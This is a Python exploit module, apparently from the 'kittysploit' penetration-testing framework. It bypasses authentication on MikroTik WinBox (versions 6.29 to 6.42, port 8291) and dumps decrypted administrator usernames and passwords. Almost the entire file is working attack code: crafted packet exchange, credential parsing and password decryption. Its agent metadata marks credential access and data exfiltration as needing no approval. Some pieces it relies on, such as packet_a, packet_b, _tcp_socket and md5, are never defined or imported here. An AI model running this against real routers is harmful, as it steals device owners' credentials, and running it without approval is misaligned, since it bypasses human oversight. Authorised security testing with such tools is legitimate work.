#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Mikrotik WinBox Auth Bypass - Creds Disclosure"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Mikrotik WinBox Auth Bypass - Creds Disclosure',
        'description': 'Module bypass authentication through WinBox service in Mikrotik devices versions from 6.29 (release date: 2015/28/05) to 6.42 (release date 2018/04/20) and retrieves administrative credentials.',
        'author': ['Alireza Mosajjal', 'Mostafa Yalpaniyan', 'Marcin Bury'],
        
        'platform': Platform.LINUX,
        'references': ['https://n0p.me/winbox-bug-dissection/', 'https://github.com/BasuCert/WinboxPoC'],
        'tags': ['iot', 'router', 'disclosure', 'credentials', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(8291, "Target WinBox service")

    def run(self):
        creds = self.get_creds()
        if creds:
            print_success("Target seems to be vulnerable")
            print_status("Dumping credentials")
            print_table(("Username", "Password"), *creds)
        else:
            print_error("Exploit failed - target does not seem to be vulnerable")
    def check(self):
        creds = self.get_creds()
        if creds:
            return True  # target is vulnerable

        return False  # target is not vulnerable
    def get_creds(self):
        creds = []

        tcp_client = _tcp_socket(self)
        tcp_client.connect()

        tcp_client.send(self.packet_a)
        data = tcp_client.recv(1024)

        if not data or len(data) < 39:
            return None

        packet = self.packet_b[:19] + data[38:39] + self.packet_b[20:]

        tcp_client.send(packet)
        data = tcp_client.recv(1024)

        if not data:
            return None

        tcp_client.close()

        creds = self.get_pair(data)
        if not creds:
            return None

        return creds
    def decrypt_password(self, user, pass_enc):
        key = md5(user + b"283i4jfkai3389").digest()

        passw = ""
        for i in range(0, len(pass_enc)):
            passw += chr(pass_enc[i] ^ key[i % len(key)])

        return passw.split("\x00")[0]
    def extract_user_pass_from_entry(self, entry):
        user_data = entry.split(b"\x01\x00\x00\x21")[1]
        pass_data = entry.split(b"\x11\x00\x00\x21")[1]

        user_len = user_data[0]
        pass_len = pass_data[0]

        username = user_data[1:1 + user_len]
        password = pass_data[1:1 + pass_len]

        return username, password
    def get_pair(self, data):
        user_list = []

        entries = data.split(b"M2")[1:]
        for entry in entries:
            try:
                user, pass_encrypted = self.extract_user_pass_from_entry(entry)
            except Exception:
                continue

            pass_plain = self.decrypt_password(user, pass_encrypted)
            user = user.decode("ascii")

            user_list.append((user, pass_plain))

        return user_list
